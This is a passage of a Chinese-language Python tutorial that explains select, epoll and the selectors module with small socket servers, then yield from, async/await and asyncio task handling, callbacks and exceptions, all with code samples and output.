                            b"HTTP/1.1 200 ok\r\nContent-Type: text/html;charset=utf-8\r\n\r\n<h1>Web Server Test</h1>"
                        )
                    else:
                        item.close()
                        socket_list.remove(item)
                        info = socket_info_dict[item]
                        print(f"[{info}已断开，当前连接数：{len(socket_list)-1}]")

if __name__ == "__main__":
    main()


输出和上面一样
扩展说明：

select 函数监视的文件描述符分3类，分别是writefds、readfds、和exceptfds。调用后select函数会阻塞，直到有描述符就绪函数返回（有数据可读、可写、或者有except）或者超时（timeout指定等待时间，如果立即返回设为null即可）
select的一个缺点在于单个进程能够监视的文件描述符的数量存在最大限制，在Linux上一般为1024（64位=>2048）

然后Poll就出现了，就是把上限给去掉了，本质并没变，还是使用的轮询
2.EPoll¶

epoll在内核2.6中提出（Linux独有），使用一个文件描述符管理多个描述符，将用户关心的文件描述符的事件存放到内核的一个事件表中，采用监听回调的机制，这样在用户空间和内核空间的copy只需一次，避免再次遍历就绪的文件描述符列表

先来看个案例吧：（输出和上面一样）

import socket
import select

def main():
    with socket.socket() as tcp_server:
        tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_server.bind(('', 8080))
        tcp_server.listen()

        # epoll是linux独有的
        epoll = select.epoll()
        # tcp_server注册到epoll中
        epoll.register(tcp_server.fileno(), select.EPOLLIN | select.EPOLLET)

        # key-value
        fd_socket_dict = dict()

        # 回调需要自己处理
        while True:
            # 返回可读写的socket fd 集合
            poll_list = epoll.poll()
            for fd, event in poll_list:
                # 服务器的socket
                if fd == tcp_server.fileno():
                    client_socket, client_addr = tcp_server.accept()
                    fd = client_socket.fileno()
                    fd_socket_dict[fd] = (client_socket, client_addr)
                    # 把客户端注册进epoll中
                    epoll.register(fd, select.EPOLLIN | select.EPOLLET)
                else:  # 客户端
                    client_socket, client_addr = fd_socket_dict[fd]
                    data = client_socket.recv(2048)
                    print(
                        f"[来自{client_addr}的消息，当前连接数：{len(fd_socket_dict)}]\n")
                    if data:
                        print(data.decode("utf-8"))
                        client_socket.send(
                            b"HTTP/1.1 200 ok\r\nContent-Type: text/html;charset=utf-8\r\n\r\n<h1>Web Server Test</h1>"
                        )
                    else:
                        del fd_socket_dict[fd]
                        print(
                            f"[{client_addr}已离线，当前连接数：{len(fd_socket_dict)}]\n"
                        )
                        # 从epoll中注销
                        epoll.unregister(fd)
                        client_socket.close()

if __name__ == "__main__":
    main()


扩展：epoll的两种工作模式

LT（level trigger，水平触发）模式：当epoll_wait检测到描述符就绪，将此事件通知应用程序，应用程序可以不立即处理该事件。下次调用epoll_wait时，会再次响应应用程序并通知此事件。LT模式是默认的工作模式。 LT模式同时支持阻塞和非阻塞socket。
ET（edge trigger，边缘触发）模式：当epoll_wait检测到描述符就绪，将此事件通知应用程序，应用程序必须立即处理该事件。如果不处理，下次调用epoll_wait时，不会再次响应应用程序并通知此事件。 ET是高速工作方式，只支持非阻塞socket（ET模式减少了epoll事件被重复触发的次数，因此效率要比LT模式高）

Code提炼一下：

实例化对象：epoll = select.epoll()
注册对象：epoll.register(tcp_server.fileno(), select.EPOLLIN | select.EPOLLET)
注销对象：epoll.unregister(fd)

PS：epoll不一定比Select性能高，一般都是分场景的：

高并发下，连接活跃度不高时：epoll比Select性能高（eg：web请求，页面随时关闭）
并发不高，连接活跃度比较高：Select更合适（eg：小游戏）
Select是win和linux通用的，而epoll只有linux有

其实IO多路复用还有一个kqueue，和epoll类似，下面的通用写法中有包含

3.通用写法（Selector）¶
一般来说：Linux下使用epoll，Win下使用select（IO多路复用会这个通用的即可）
先看看Python源代码：

# 选择级别：epoll|kqueue|devpoll > poll > select
if 'KqueueSelector' in globals():
    DefaultSelector = KqueueSelector
elif 'EpollSelector' in globals():
    DefaultSelector = EpollSelector
elif 'DevpollSelector' in globals():
    DefaultSelector = DevpollSelector
elif 'PollSelector' in globals():
    DefaultSelector = PollSelector
else:
    DefaultSelector = SelectSelector


实战案例：(可读和可写可以不分开)

import socket
import selectors

# Linux下使用epoll，Win下使用select
Selector = selectors.DefaultSelector()

class Task(object):
    def __init__(self):
        # 存放客户端fd和socket键值对
        self.fd_socket_dict = dict()

    def run(self):
        self.server = socket.socket()
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('', 8080))
        self.server.listen()
        # 把Server注册到epoll
        Selector.register(self.server.fileno(), selectors.EVENT_READ,
                          self.connected)

    def connected(self, key):
        """客户端连接时处理"""
        client_socket, client_address = self.server.accept()
        fd = client_socket.fileno()
        self.fd_socket_dict[fd] = (client_socket, client_address)
        # 注册一个客户端读的事件（服务端去读消息）
        Selector.register(fd, selectors.EVENT_READ, self.call_back_reads)
        print(f"{client_address}已连接，当前连接数：{len(self.fd_socket_dict)}")

    def call_back_reads(self, key):
        """客户端可读时处理"""
        # 一个fd只能注册一次，监测可写的时候需要把可读给注销
        Selector.unregister(key.fd)
        client_socket, client_address = self.fd_socket_dict[key.fd]
        print(f"[来自{client_address}的消息:]\n")
        data = client_socket.recv(2048)
        if data:
            print(data.decode("utf-8"))
            # 注册一个客户端写的事件（服务端去发消息）
            Selector.register(key.fd, selectors.EVENT_WRITE,
                              self.call_back_writes)
        else:
            client_socket.close()
            del self.fd_socket_dict[key.fd]
            print(f"{client_address}已断开，当前连接数：{len(self.fd_socket_dict)}")

    def call_back_writes(self, key):
        """客户端可写时处理"""
        Selector.unregister(key.fd)
        client_socket, client_address = self.fd_socket_dict[key.fd]
        client_socket.send(b"ok")
        Selector.register(key.fd, selectors.EVENT_READ, self.call_back_reads)

def main():
    t = Task()
    t.run()
    while True:
        ready = Selector.select()
        for key, obj in ready:
            # 需要自己回调
            call_back = key.data
            call_back(key)

if __name__ == "__main__":
    main()


Code提炼一下：

实例化对象：Selector = selectors.DefaultSelector()
注册对象：

Selector.register(server.fileno(), selectors.EVENT_READ, call_back)
Selector.register(server.fileno(), selectors.EVENT_WRITE, call_back)


注销对象：Selector.unregister(key.fd)
注意一下：一个fd只能注册一次，监测可写的时候需要把可读给注销（反之一样）

业余拓展：
select, iocp, epoll,kqueue及各种I/O复用机制
https://blog.csdn.net/shallwake/article/details/5265287

kqueue用法简介
http://www.cnblogs.com/luminocean/p/5631336.html




 


3.4.协程引入¶
1.yield from¶
我们经常有这样的需求：读取两个分表的数据列表，然后合并之后进行一些处理
平时可以借用itertools.chain来遍历：

# https://docs.python.org/3/library/itertools.html#itertools.chain
import itertools

def main():
    # 模拟分表后的两个查询结果
    user1 = ["小张", "小明"]
    user2 = ["小潘", "小周"]
    # dict只能遍历key（这种情况需要自己封装合并方法并处理下）
    user3 = {"name": "test1", "name1": "test2"}

    # 需求：合并并遍历
    for item in itertools.chain(user1, user2, user3):
        print(item)

if __name__ == '__main__':
    main()


输出：
小张
小明
小潘
小周
name
name1
它的内部实现其实是这样的：（相当于两层遍历，用yield返回）

def my_chain(*args, **kwargs):
    for items in args:
        for item in items:
            yield item

def main():
    # 模拟分表后的两个查询结果
    user1 = ["小张", "小明"]
    user2 = ["小潘", "小周"]
    # dict只能遍历key（这种情况需要自己封装合并方法并处理下）
    user3 = {"name": "test1", "name1": "test2"}

    # 需求：合并并遍历
    for item in my_chain(user1, user2, user3):
        print(item)

if __name__ == '__main__':
    main()


然后Python3.3之后语法再一步简化（yield from iterable对象）

def my_chain(*args, **kwargs):
    for items in args:
        yield from items

def main():
    # 模拟分表后的两个查询结果
    user1 = ["小张", "小明"]
    user2 = ["小潘", "小周"]

    # 需求：合并并遍历
    for item in my_chain(user1, user2):
        print(item)

if __name__ == '__main__':
    main()


输出：
小张
小明
小潘
小周
test1
test2
扩展（可忽略）¶
其实知道了内部实现，很容易就写上一段应对的处理：

def my_chain(*args, **kwargs):
    for my_iterable in args:
        # 如果是字典类型就返回value
        if isinstance(my_iterable, dict):
            my_iterable = my_iterable.values()
        for item in my_iterable:
            yield item

def main():
    # 模拟分表后的两个查询结果
    user1 = ["小张", "小明"]
    user2 = ["小潘", "小周"]
    # dict只能遍历key（这种情况需要自己封装合并方法并处理下）
    user3 = {"name": "test1", "name1": "test2"}
    # 需求：合并并遍历
    for item in my_chain(user1, user2, user3):
        print(item)

if __name__ == '__main__':
    main()


输出：
小张
小明
小潘
小周
test1
test2
扩展的正确处理¶
PS：一般不会这么干的，一般都是[{},{}]遍历并处理：

import itertools

def main():
    # 模拟分表后的两个查询结果
    user1 = [{"name": "小张"}, {"name": "小明"}]
    user2 = [{"name": "小潘"}, {"name": "小周"}]
    user3 = [{"name": "test1"}, {"name": "test2"}]
    # 需求：合并并遍历
    for item in itertools.chain(user1, user2, user3):
        # 一般都是直接在这里进行处理
        for key, value in item.items():
            print(value)

if __name__ == '__main__':
    main()


1.yield版协程¶
协程的目的其实很简单：像写同步代码那样实现异步编程
先看个需求：生成绘图的数据（max,min,avg）
比如说原来数据是这样的：

products = [{
    "id": 2344,
    "title": "御泥坊补水面膜",
    "price": [89, 76, 120, 99]
}, {
    "id": 2345,
    "title": "御泥坊火山泥面膜",
    "price": [30, 56, 70, 89]
}]


处理之后：

new_products = [{
    "id": 2344,
    "title": "御泥坊补水面膜",
    "price": [89, 76, 120, 99],
    "max": 120,
    "min": 76,
    "avg": 96.0
},
{
    "id": 2345,
    "title": "御泥坊火山泥面膜",
    "price": [30, 56, 70, 89],
    "max": 89,
    "min": 30,
    "avg": 61.25
}]


处理过的数据一般用来画图，实际效果类似于： 
如果不借助协程，我们一般这么处理：（数据库获取过程省略）





In [14]:



# 生成新的dict数据
def get_new_item(item):
    prices = item["price"]
    item["avg"] = sum(prices) / len(prices)
    item["max"] = max(prices)
    item["min"] = min(prices)
    return item

def get_new_data(data):
    newdata = []
    for item in data:
        new_item = get_new_item(item)
        # print(new_item) # 处理后的新dict
        newdata.append(new_item)
    return newdata

def main():
    # 需求：生成绘图的数据（max,min,avg）
    products = [{
        "id": 2344,
        "title": "御泥坊补水面膜",
        "price": [89, 76, 120, 99]
    }, {
        "id": 2345,
        "title": "御泥坊火山泥面膜",
        "price": [30, 56, 70, 89]
    }]

    new_products = get_new_data(products)
    print(new_products)

if __name__ == "__main__":
    main()








 

[{'id': 2344, 'title': '御泥坊补水面膜', 'price': [89, 76, 120, 99], 'avg': 96.0, 'max': 120, 'min': 76}, {'id': 2345, 'title': '御泥坊火山泥面膜', 'price': [30, 56, 70, 89], 'avg': 61.25, 'max': 89, 'min': 30}]







 


改成yield版的协程也很方便，基本上代码没有变，也不用像IO多路复用那样来回的回调





In [15]:



# 生成新的dict数据
def get_new_item(item):
    prices = item["price"]
    item["avg"] = sum(prices) / len(prices)
    item["max"] = max(prices)
    item["min"] = min(prices)
    yield item

def get_new_data(data):
    for item in data:
        yield from get_new_item(item)

def main():
    # 需求：生成绘图的数据（max,min,avg）
    products = [{
        "id": 2344,
        "title": "御泥坊补水面膜",
        "price": [89, 76, 120, 99]
    }, {
        "id": 2345,
        "title": "御泥坊火山泥面膜",
        "price": [30, 56, 70, 89]
    }]
    new_products = list()
    # 如果需要返回值就捕获StopIteration异常
    for item in get_new_data(products):
        new_products.append(item)
    print(new_products)

if __name__ == "__main__":
    main()








 

[{'id': 2344, 'title': '御泥坊补水面膜', 'price': [89, 76, 120, 99], 'avg': 96.0, 'max': 120, 'min': 76}, {'id': 2345, 'title': '御泥坊火山泥面膜', 'price': [30, 56, 70, 89], 'avg': 61.25, 'max': 89, 'min': 30}]







 


简单解析一下：（用yield from的目的就是为了引出等会说的async/await）
yield from（委托生成器get_new_data）的好处就是让调用方（main）和yield子生成器(get_new_item)直接建立一个双向通道
你也可以把yield from当作一个中介(如果不理解就把yield from想象成await就容易理解了)，本质就是下面代码：





In [16]:



# 生成新的数据
def get_new_data(data):
    for item in data:
        prices = item["price"]
        item["avg"] = sum(prices) / len(prices)
        item["max"] = max(prices)
        item["min"] = min(prices)
        yield item


def main():
    # 需求：生成绘图的数据（max,min,avg）
    products = [{
        "id": 2344,
        "title": "御泥坊补水面膜",
        "price": [89, 76, 120, 99]
    }, {
        "id": 2345,
        "title": "御泥坊火山泥面膜",
        "price": [30, 56, 70, 89]
    }]
    new_products = list()
    for item in get_new_data(products):
        new_products.append(item)
    print(new_products)


if __name__ == "__main__":
    main()








 

[{'id': 2344, 'title': '御泥坊补水面膜', 'price': [89, 76, 120, 99], 'avg': 96.0, 'max': 120, 'min': 76}, {'id': 2345, 'title': '御泥坊火山泥面膜', 'price': [30, 56, 70, 89], 'avg': 61.25, 'max': 89, 'min': 30}]







 


PEP 380（含分析）¶
yield from内部其实在yield基础上做了很多事情（比如一些异常的处理），具体可以看看 PEP 380
先提炼一个简版的：

# 正常调用
RESULT = yield from EXPR

# _i：子生成器（也是个迭代器）
# _y：子生成器生产的值
# _r：yield from 表达式最终结果
# _s：调用方通过send发送的值
# _e：异常对象

# 内部原理
_i = iter(EXPR) # EXPR是一个可迭代对象，_i是子生成器
try:
    # 第一次不能send值，只能next() or send(None)，并把产生的值放到_y中
    _y = next(_i)
except StopIteration as _e:
    # 如果子生成器直接就return了，那就会抛出异常，通过value可以拿到子生成器的返回值
    _r = _e.value
else:
    # 尝试进行循环（调用方和子生成器交互过程），yield from这个生成器会阻塞（委托生成器）
    while 1:
        # 这时候子生成器已经和调用方建立了双向通道，在等待调用方send(value)，把这个值保存在_s中
        _s = yield _y # 这边还会进行一系列异常处理，我先删掉，等会看
        try:
            # 如果send(None)，那么继续next遍历
            if _s is None:
                _y = next(_i) # 把子生成器结果放到 _y 中
            else:
                _y = _i.send(_s) # 如果调用方send一个值，就转发到子生成器
        except StopIteration as _e:
            _r = _e.value # 如果子生成器遍历完了，就把返回值给_r
            break
RESULT = _r # 最终的返回值（yield from 最终的返回值）


现在再来看完整版压力就没有那么大了：

# 正常调用
RESULT = yield from EXPR

# _i：子生成器（也是个迭代器）
# _y：子生成器生产的值
# _r：yield from 表达式最终结果
# _s：调用方通过send发送的值
# _e：异常对象

# 内部原理
_i = iter(EXPR) # EXPR是一个可迭代对象，_i是子生成器
try:
    # 第一次不能send值，只能next() or send(None)，并把产生的值放到_y中
    _y = next(_i)
except StopIteration as _e:
    # 如果子生成器直接就return了，那就会抛出异常，通过value可以拿到子生成器的返回值
    _r = _e.value
else:
    # 尝试进行循环（调用方和子生成器交互过程），yield from这个生成器会阻塞（委托生成器）
    while 1:
        try:
            # 这时候子生成器已经和调用方建立了双向通道，在等待调用方send(value)，把这个值保存在_s中
            _s = yield _y

        # 【现在补全】有这么几种情况需要处理
        # 1.子生成器可能只是一个迭代器，并不能作为协程的生成器（不支持throw和close）
        # 2.子生成器虽然支持了throw和close，但在子生成器内部两种方法都会抛出异常
        # 3.调用法调用了gen.throw()，想让子生成器自己抛异常
        # 这时候就要处理 gen.close() 和 gen.throw()的情况

        # 生成器close()异常的处理
        except GeneratorExit as _e:
            try:
                _m = _i.close
            except AttributeError:
                pass # 屏蔽close的异常
            else:
                _m()
            raise _e # 上抛异常
        # 生成器throw()异常的处理
        except BaseException as _e:
            _x = sys.exc_info()
            try:
                _m = _i.throw
            except AttributeError:
                raise _e
            else:
                try:
                    _y = _m(*_x)
                except StopIteration as _e:
                    _r = _e.value
                    break
        else:
            try:
                # 如果send(None)，那么继续next遍历
                if _s is None:
                    _y = next(_i) # 把子生成器结果放到 _y 中
                else:
                    _y = _i.send(_s) # 如果调用方send一个值，就转发到子生成器
            except StopIteration as _e:
                _r = _e.value # 如果子生成器遍历完了，就把返回值给_r
                break
RESULT = _r # 最终的返回值（yield from 最终的返回值）


2.async/await¶
把上面的原生代码用async和await改装一下：(协程的目的就是像写同步代码一样写异步，这个才算是真做到了)

import asyncio

# 生成新的dict数据
async def get_new_item(item):
    prices = item["price"]
    item["avg"] = sum(prices) / len(prices)
    item["max"] = max(prices)
    item["min"] = min(prices)
    return item

async def get_new_data(data):
    newdata = []
    for item in data:
        new_item = await get_new_item(item)
        # print(new_item) # 处理后的新dict
        newdata.append(new_item)
    return newdata

def main():
    # 需求：生成绘图的数据（max,min,avg）
    products = [{
        "id": 2344,
        "title": "御泥坊补水面膜",
        "price": [89, 76, 120, 99]
    }, {
        "id": 2345,
        "title": "御泥坊火山泥面膜",
        "price": [30, 56, 70, 89]
    }]

    # python 3.7
    new_products = asyncio.run(get_new_data(products))
    print(new_products)

if __name__ == "__main__":
    main()


输出：（是不是很原生代码没啥区别？）
[{'id': 2344, 'title': '御泥坊补水面膜', 'price': [89, 76, 120, 99], 'avg': 96.0, 'max': 120, 'min': 76}, 
{'id': 2345, 'title': '御泥坊火山泥面膜', 'price': [30, 56, 70, 89], 'avg': 61.25, 'max': 89, 'min': 30}]
下级预估：asyncio




 


3.5.asyncio¶
官方文档：https://docs.python.org/3/library/asyncio.html
开发中常见错误：https://docs.python.org/3/library/asyncio-dev.html
代码示例：https://github.com/lotapp/BaseCode/tree/master/python/5.concurrent/ZCoroutine
PS：asyncio是Python用于解决异步IO编程的一整套解决方案
3.5.1.上节回顾¶
上次说了下协程演变过程，这次继续，先接着上次的说：
像JS是可以生成器和async和await混用的，那Python呢？（NetCore不可以混用）

import types

# 和生成器完全分开了，不过可以理解为yield from
@types.coroutine
def get_value(value):
    yield value

async def get_name(name):
    # 一系列逻辑处理
    return await get_value(name)

if __name__ == '__main__':
    gen = get_name("小明")
    print(gen.send(None))
# 直接混用会报错：TypeError: object generator can't be used in 'await' expression


我们的async和await虽然和yield from不是一个概念，但是可以理解为yield from上面这段代码你可以理解为：

import types

def get_value(value):
    yield value

# 这个async和await替换成yield from
def get_name(name):
    # 一系列逻辑处理
    yield from get_value(name)

if __name__ == '__main__':
    gen = get_name("小明")
    print(gen.send(None))


PS：Python默认和NetCore一样，不能直接混用，如果你一定要混用，那么得处理下（使用@asyncio.coroutine也行）
3.5.2.asyncio引入¶
在今天之前，协程我们是这么实现的：事件循环(loop)+回调(驱动生成器)+IO多路复用(epoll)
现在可以通过官方提供的asyncio（可以理解为协程池）来实现了（第三方还有一个uvloop【基于C写的libuv库（nodejs也是基于这个库）】）
PS：uvloop的使用非常简单，只要在获取事件循环前将asyncio的事件循环策略设置为uvloop的:asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
1.简单案例¶
先看个简单的协程案例：

import types
import asyncio

# 模拟一个耗时操作
async def test():
    print("start...")
    # 不能再使用以前阻塞的暂停了
    await asyncio.sleep(2)
    print("end...")
    return "ok"

if __name__ == '__main__':
    import time
    start_time = time.time()

    # # >=python3.4
    # # 返回asyncio的事件循环
    # loop = asyncio.get_event_loop()
    # # 运行事件循环，直到指定的future运行完毕，返回结果
    # result = loop.run_until_complete(test())
    # print(result)

    # python3.7
    result = asyncio.run(test())
    print(result)

    print(time.time() - start_time)


输出：
start...
end...
ok
2.001772403717041
简单说下，asyncio.run是python3.7才简化出来的语法（类比NetCore的Task.Run）看看源码就知道了：

# https://github.com/lotapp/cpython3/blob/master/Lib/asyncio/runners.py
def run(main, *, debug=False):
    # 以前是直接使用"asyncio.get_event_loop()"（开发人员一般都习惯这个了）
    # 3.7开始推荐使用"asyncio.get_running_loop()"来获取正在运行的loop（获取不到就抛异常）
    if events._get_running_loop() is not None:
        raise RuntimeError("无法从正在运行的事件循环中调用asyncio.run()")

    if not coroutines.iscoroutine(main):
        raise ValueError("{!r}应该是一个协程".format(main))

    loop = events.new_event_loop() # 创建一个新的事件循环
    try:
        events.set_event_loop(loop)  # 设置事件循环
        loop.set_debug(debug)  # 是否调试运行（默认否）
        return loop.run_until_complete(main)  # 等待运行
    finally:
        try:
            _cancel_all_tasks(loop)  # 取消其他任务
            loop.run_until_complete(loop.shutdown_asyncgens())
        finally:
            events.set_event_loop(None)
            loop.close()


新版本其实就是使用了一个新的loop去启动run_until_complete
PS：uvloop也可以这样去使用：获取looploop = uvloop.new_event_loop()再替换原生的loopasyncio.set_event_loop(loop)
3.5.3.批量任务¶
1.旧版本实现¶

import asyncio

# 模拟一个耗时操作
async def test(i):
    print("start...")
    # 不能再使用以前阻塞的暂停了
    await asyncio.sleep(2)
    print("end...")
    return i

if __name__ == '__main__':
    import time

    start_time = time.time()

    # # >=python3.4
    loop = asyncio.get_event_loop()
    # tasks = [asyncio.ensure_future(test(i)) for i in range(10)]
    # 注意：是loop的方法，而不是asyncio的，不然就会引发RuntimeError：no running event loop
    tasks = [loop.create_task(test(i)) for i in range(10)]
    loop.run_until_complete(asyncio.wait(tasks))
    for task in tasks:
        print(task.result())

    print(time.time() - start_time)


输出：(tasks替换成这个也一样：tasks = [asyncio.ensure_future(test(i)) for i in range(10)])
start...
start...
start...
start...
start...
start...
start...
start...
start...
start...
end...
end...
end...
end...
end...
end...
end...
end...
end...
end...
0
1
2
3
4
5
6
7
8
9
2.028331995010376
然后我们再看看这个asyncio.wait是个啥：（回顾：https://www.cnblogs.com/dotnetcrazy/p/9528315.html#wait()说明）
# return_when 这个参数和之前一样
FIRST_COMPLETED = concurrent.futures.FIRST_COMPLETED
FIRST_EXCEPTION = concurrent.futures.FIRST_EXCEPTION
ALL_COMPLETED = concurrent.futures.ALL_COMPLETED

# 官方准备在未来版本废弃它的loop参数
# 和concurrent.futures里面的wait不一样，这边是个协程
async def wait(fs, *, loop=None, timeout=None, return_when=ALL_COMPLETED):
平时使用可以用高级APIasyncio.gather(*tasks)来替换asyncio.wait(tasks)
1.旧版另用¶
PS：官方推荐使用create_task的方式来创建一个任务

import asyncio

# 模拟一个耗时操作
async def test(i):
    print("start...")
    # 不能再使用以前阻塞的暂停了
    await asyncio.sleep(2)
    print("end...")
    return i

async def main():
    tasks = [test(i) for i in range(10)]
    # await task 可以得到返回值（得到结果或者异常）
    # for task in asyncio.as_completed(tasks):
    #     try:
    #         print(await task)
    #     except Exception as ex:
    #         print(ex)
    return [await task for task in asyncio.as_completed(tasks)]

if __name__ == '__main__':
    import time

    start_time = time.time()

    # old推荐使用
    loop = asyncio.get_event_loop()
    result_list = loop.run_until_complete(main())
    print(result_list)

    print(time.time() - start_time)


输出：(PS：用asyncio.gather(*tasks)直接替换asyncio.wait(tasks)也行)
start...
start...
start...
start...
start...
start...
start...
start...
start...
start...
end...
end...
end...
end...
end...
end...
end...
end...
end...
end...
[1, 6, 4, 5, 0, 7, 8, 3, 2, 9]
2.0242035388946533
其实理解起来很简单，而且和NetCore以及NodeJS它们统一了，只要是await xxx就返回一个（结果|异常），不await就是一个task对象
2.新版本实现¶

import asyncio

# 模拟一个耗时操作
async def test(i):
    print("start...")
    await asyncio.sleep(2)
    print("end...")
    return i

async def main():
    tasks = [test(i) for i in range(10)]
    # 给`协程/futures`返回一个future聚合结果
    return await asyncio.gather(*tasks) # 记得加*来解包

if __name__ == '__main__':
    import time

    start_time = time.time()

    # python3.7
    result_list = asyncio.run(main())
    print(result_list)

    # 2.0259485244750977
    print(time.time() - start_time)


输出：(语法简化太多了，用起来特别简单)
start...
start...
start...
start...
start...
start...
start...
start...
start...
start...
end...
end...
end...
end...
end...
end...
end...
end...
end...
end...
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
2.00840163230896
关于参数需要加*解包的说明 ==> 看看函数定义就秒懂了：

# 给 协程/futures 返回一个future聚合结果
def gather(*coros_or_futures, loop=None, return_exceptions=False):
    pass

# 把协程或者awaitable对象包裹成task
def ensure_future(coro_or_future, *, loop=None):
    pass

# 传入一个协程对象，返回一个task对象
class BaseEventLoop(events.AbstractEventLoop):
    def create_task(self, coro):
        pass


关于高级和低级API的说明¶
asyncio的高级（high-level）API一般用于这几个方面：（开发基本够用了）

并行运行Python协同程序并完全控制它们的执行
网络通信（IO）和进程间通信（IPC）
子进程（subprocesses）相关
通过队列（Queue）分配任务（Tasks）
同步（synchronize）并发代码

低级（low-level）API一般这么用：（事件循环和回调会用下，其他基本不用）

创建和管理事件循环，为网络、子进程、信号处理（Signal）等提供异步（asynchronous）API
为传输使用高效协议
使用async/await语法桥接基于回调的库和代码

3.5.4.回调函数¶
回调一般不利于代码维护，现在基本上是尽量不用了（异步代码用起来都和同步没多大差别了，回调也就没那么大用处了）
1.回调函数获取返回值¶
上面说的获取返回值，其实也可以通过回调函数来获取：

# 低级API示例
import asyncio

async def get_html(url):
    print(f"get {url} ing")
    await asyncio.sleep(2)
    return f"<h1>This is a test for {url}</h1>"

def call_back(task):
    print(type(task))
    print(task.result())

if __name__ == "__main__":
    import time
    start_time = time.time()

    urls = [
        "https://www.baidu.com", "https://www.sogou.com",
        "https://www.python.org", "https://www.asp.net"
    ]
    tasks = set()  # 任务集合
    loop = asyncio.get_event_loop()
    for url in urls:
        # task = asyncio.ensure_future(get_html(url))
        task = loop.create_task(get_html(url))
        # 设置回调函数
        task.add_done_callback(call_back)
        # 添加到任务集合中
        tasks.add(task)
    # 批量执行
    loop.run_until_complete(asyncio.gather(*tasks))

    print(time.time() - start_time)


输出：（task.add_done_callback(回调函数)）
get https://www.baidu.com ing
get https://www.sogou.com ing
get https://www.python.org ing
get https://www.asp.net ing
<class '_asyncio.Task'>
<h1>This is a test for https://www.baidu.com</h1>
<class '_asyncio.Task'>
<h1>This is a test for https://www.python.org</h1>
<class '_asyncio.Task'>
<h1>This is a test for https://www.sogou.com</h1>
<class '_asyncio.Task'>
<h1>This is a test for https://www.asp.net</h1>
2.0168468952178955
2.回调函数传参扩展¶
实例：

import asyncio
import functools

async def get_html(url):
    await asyncio.sleep(2)
    return "This is a test for"

# 注意一个东西：通过偏函数传过来的参数在最前面
def call_back(url, task):
    # do something
    print(type(task))
    print(task.result(), url)

if __name__ == "__main__":
    import time
    start_time = time.time()

    urls = [
        "https://www.baidu.com", "https://www.sogou.com",
        "https://www.python.org", "https://www.asp.net"
    ]
    tasks = set()  # 任务集合
    loop = asyncio.get_event_loop()
    for url in urls:
        # task = asyncio.ensure_future(get_html(url))
        task = loop.create_task(get_html(url))
        # 设置回调函数 （不支持传参数，我们就利用偏函数来传递）
        task.add_done_callback(functools.partial(call_back, url))
        # 添加到任务集合中
        tasks.add(task)
    # 批量执行
    loop.run_until_complete(asyncio.gather(*tasks))

    print(time.time() - start_time)


输出：(PS：通过偏函数传过来的参数在最前面)
<class '_asyncio.Task'>
This is a test for https://www.baidu.com
<class '_asyncio.Task'>
This is a test for https://www.python.org
<class '_asyncio.Task'>
This is a test for https://www.sogou.com
<class '_asyncio.Task'>
This is a test for https://www.asp.net
2.0167236328125
3.5.5.异常相关¶
之前说的await task可能得到结果也可能得到异常有些人可能还不明白 ==> 其实你把他看出同步代码（PS：协程的目的就是像写同步代码一样进行异步编程）就好理解了，函数执行要么得到结果要么得到返回值
看个异常的案例：

import asyncio

async def get_html(url):
    print(f"get {url} ing")
    if url == "https://www.asp.net":
        raise Exception("Exception is over")
    await asyncio.sleep(2)
    return f"<h1>This is a test for {url}</h1>"

async def main():
    urls = [
        "https://www.baidu.com", "https://www.asp.net",
        "https://www.python.org", "https://www.sogou.com"
    ]
    tasks = [get_html(url) for url in urls]
    return await asyncio.gather(*tasks)

if __name__ == "__main__":
    import time
    start_time = time.time()

    try:
        asyncio.run(main())
    except Exception as ex:
        print(ex)

    print(time.time() - start_time)


输出：(和同步代码没差别，可能出异常的部分加个异常捕获即可)
get https://www.baidu.com ing
get https://www.asp.net ing
get https://www.python.org ing
get https://www.sogou.com ing
Exception is over
0.008000373840332031
再一眼旧版怎么用：（PS：基本差不多，下次全部用新用法了）

import asyncio

async def get_html(url):
    print(f"get {url} ing")
    if url == "https://www.asp.net":
        raise Exception("Exception is over")
    await asyncio.sleep(2)
    return f"<h1>This is a test for {url}</h1>"

async def main():
    urls = [
        "https://www.baidu.com", "https://www.asp.net",
        "https://www.python.org", "https://www.sogou.com"
    ]
    tasks = set()  # 任务集合
    tasks = [get_html(url) for url in urls]
    return await asyncio.gather(*tasks)

if __name__ == "__main__":
    import time
    start_time = time.time()

    loop = asyncio.get_event_loop()
    try:
        # 批量执行
        loop.run_until_complete(main())
    except Exception as ex:
        print(ex)

    print(time.time() - start_time)


常见异常¶
Python3调试过程中的常见异常：https://www.cnblogs.com/dotnetcrazy/p/9192089.html
asyncio中常见异常¶
官方文档：https://docs.python.org/3/library/asyncio-exceptions.html

asyncio.TimeoutError(Exception.Error)：

任务超时引发的异常


asyncio.CancelledError(Exception.Error)：

任务取消引发的异常


asyncio.InvalidStateError(Exception.Error)：

Task/Future内部状态无效引发


asyncio.IncompleteReadError(Exception.Error)：读取未完成引发的错误:

不完整: 在到达流结束之前读取字节字符串（读取了不完整的字符串就转换了）
不清楚读多少: 预期读取的字节总数未知


asyncio.LimitOverrunError(Exception)：

超出缓冲区引发的异常


asyncio.SendfileNotAvailableError(Exception.ReferenceError.RuntimeError)：

系统调用不适用于给定的套接字或文件类型（系统调用类型不匹配导致的）



Python常见异常¶
有些异常官方没有写进去，我补了一些常用的异常：https://docs.python.org/3/library/exceptions.html
BaseException

SystemExit：sys.exit()引发的异常（目的：让Python解释器退出）
KeyboardInterrupt：用户Ctrl+C终止程序引发的异常
GeneratorExit：生成器或者协程关闭的时候产生的异常（特别注意）
Exception：所有内置异常（非系统退出）或者用户定义异常的基类

asyncio.Error

asyncio.CancelledError
asyncio.TimeoutError：和Exception.OSError.TimeoutError区分开
asyncio.InvalidStateError：Task/Future内部状态无效引发


asyncio.LimitOverrunError：超出缓冲区引发的异常
StopIteration：next()、send()引发的异常：

https://www.cnblogs.com/dotnetcrazy/p/9278573.html#6.Python迭代器


StopAsyncIteration：__anext__()引发的异常
ArithmeticError

FloatingPointError
OverflowError
ZeroDivisionError


AssertionError：当断言assert语句失败时引发
AttributeError：当属性引用或赋值失败时引发
BufferError
EOFError

asyncio.IncompleteReadError：读取操作未完成引发的错误


ImportError

ModuleNotFoundError


LookupError

IndexError
KeyError


MemoryError
NameError

UnboundLocalError


OSError：当系统函数返回与系统相关的错误时引发

BlockingIOError
ChildProcessError
